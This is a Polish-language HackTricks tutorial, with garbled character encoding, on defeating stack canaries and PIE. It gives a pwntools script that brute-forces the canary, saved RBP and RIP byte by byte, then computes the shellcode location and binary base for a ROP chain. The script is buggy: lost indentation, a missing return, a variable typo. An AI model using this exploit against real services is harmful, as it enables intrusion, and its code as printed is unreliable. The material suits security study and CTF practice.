# Adresy BF na stosie

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

**JeÅ›li masz do czynienia z binarnym plikiem zabezpieczonym przez canary i PIE (Position Independent Executable), prawdopodobnie bÄ™dziesz musiaÅ‚ znaleÅºÄ‡ sposÃ³b na ich obejÅ›cie.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
ZauwaÅ¼, Å¼e **`checksec`** moÅ¼e nie wykryÄ‡, Å¼e binarny plik jest zabezpieczony przez canary, jeÅ›li zostaÅ‚ on skompilowany statycznie i nie jest w stanie zidentyfikowaÄ‡ funkcji.\
MoÅ¼esz jednak zauwaÅ¼yÄ‡ to rÄ™cznie, jeÅ›li zauwaÅ¼ysz, Å¼e wartoÅ›Ä‡ jest zapisywana na stosie na poczÄ…tku wywoÅ‚ania funkcji, a nastÄ™pnie sprawdzana przed wyjÅ›ciem.
{% endhint %}

## Adresy Brute-Force

Aby ominÄ…Ä‡ PIE, musisz **wyciec pewien adres**. JeÅ›li binarny plik nie wycieka Å¼adnych adresÃ³w, najlepiej jest **przeprowadziÄ‡ atak siÅ‚owy na RBP i RIP zapisane na stosie** w podatnej funkcji.\
Na przykÅ‚ad, jeÅ›li binarny plik jest zabezpieczony zarÃ³wno **canary**, jak i **PIE**, moÅ¼esz zaczÄ…Ä‡ atak siÅ‚owy na canary, a nastÄ™pnie **nastÄ™pne** 8 bajtÃ³w (x64) bÄ™dÄ… zapisane jako **RBP**, a **kolejne** 8 bajtÃ³w bÄ™dÄ… zapisane jako **RIP**.

{% hint style="success" %}
ZaÅ‚oÅ¼enie jest takie, Å¼e adres powrotu na stosie naleÅ¼y do kodu binarnego gÅ‚Ã³wnego, co w przypadku, gdy podatnoÅ›Ä‡ znajduje siÄ™ w kodzie binarnym, zazwyczaj bÄ™dzie prawdÄ….
{% endhint %}

Aby przeprowadziÄ‡ atak siÅ‚owy na RBP i RIP z binarnego pliku, moÅ¼esz ustaliÄ‡, Å¼e poprawny zgadniÄ™ty bajt jest poprawny, jeÅ›li program coÅ› wypisze lub po prostu nie ulegnie awarii. **Ta sama funkcja**, co ta uÅ¼ywana do ataku siÅ‚owego na canary, moÅ¼e byÄ‡ uÅ¼yta do ataku siÅ‚owego na RBP i RIP:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
OstatniÄ… rzeczÄ…, ktÃ³rÄ… musisz zrobiÄ‡, aby pokonaÄ‡ PIE, jest obliczenie **uÅ¼ytecznych adresÃ³w z wyciekÅ‚ych** adresÃ³w: **RBP** i **RIP**.

Z **RBP** moÅ¼esz obliczyÄ‡ **gdzie zapisujesz swÃ³j shell na stosie**. MoÅ¼e to byÄ‡ bardzo przydatne, aby wiedzieÄ‡, gdzie zamierzasz zapisaÄ‡ ciÄ…g _"/bin/sh\x00"_ wewnÄ…trz stosu. Aby obliczyÄ‡ odlegÅ‚oÅ›Ä‡ miÄ™dzy wyciekiem RBP a swoim kodem shell, wystarczy ustawiÄ‡ **punkt przerwania po wycieku RBP** i sprawdziÄ‡ **gdzie znajduje siÄ™ twÃ³j kod shell**, a nastÄ™pnie obliczyÄ‡ odlegÅ‚oÅ›Ä‡ miÄ™dzy kodem shell a RBP:
```python
INI_SHELLCODE = RBP - 1152
```
Z **RIP** moÅ¼na obliczyÄ‡ **bazowy adres binarny PIE**, ktÃ³ry bÄ™dzie potrzebny do utworzenia **poprawnego Å‚aÅ„cucha ROP**.\
Aby obliczyÄ‡ bazowy adres, wystarczy wykonaÄ‡ `objdump -d vunbinary` i sprawdziÄ‡ ostatnie adresy rozkÅ‚adu:

![](<../../../../.gitbook/assets/image (145).png>)

W tym przykÅ‚adzie widaÄ‡, Å¼e potrzebne jest tylko **1,5 bajta**, aby zlokalizowaÄ‡ caÅ‚y kod, wiÄ™c w tej sytuacji bazowy adres bÄ™dzie **przeciekiem RIP, ale koÅ„czÄ…cy siÄ™ na "000"**. Na przykÅ‚ad, jeÅ›li przeciekÅ‚eÅ› `0x562002970ecf`, bazowy adres to `0x562002970000`
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
